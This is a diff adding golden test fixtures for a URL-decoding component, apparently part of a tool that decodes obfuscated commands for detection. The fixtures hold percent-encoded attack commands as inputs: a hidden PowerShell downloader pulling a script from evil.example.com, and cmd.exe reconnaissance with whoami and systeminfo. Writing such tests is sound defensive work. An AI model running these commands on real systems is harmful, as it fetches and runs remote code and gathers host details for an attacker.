@@ -1,0 +1,5 @@
+# url-decode · Golden Fixtures · RC3.2a
+# Percent-encoded (RFC 3986). Handles single-, double- and mixed-encoding.
+{"case_id":"url-plain-ps","description":"Percent-encoded PowerShell iwr downloader","input":"powershell.exe%20-nop%20-w%20hidden%20-c%20iwr%20%22http%3A%2F%2Fevil.example.com%2Fx.ps1%22","detect_min_confidence":0.5,"expected_output_contains":["powershell.exe","iwr","http://evil.example.com/x.ps1"]}
+{"case_id":"url-double-encoded","description":"Double URL-encoded (%2520 = %20)","input":"powershell.exe%2520-c%2520calc.exe","detect_min_confidence":0.4,"expected_output_contains":["powershell.exe","-c","calc.exe"]}
+{"case_id":"url-lowercase-hex","description":"Percent escape uses lowercase hex nibbles (some encoders default to lower)","input":"cmd.exe%20%2fc%20whoami%20%26%26%20systeminfo","detect_min_confidence":0.4,"expected_output_contains":["cmd.exe","/c","whoami","systeminfo"]}
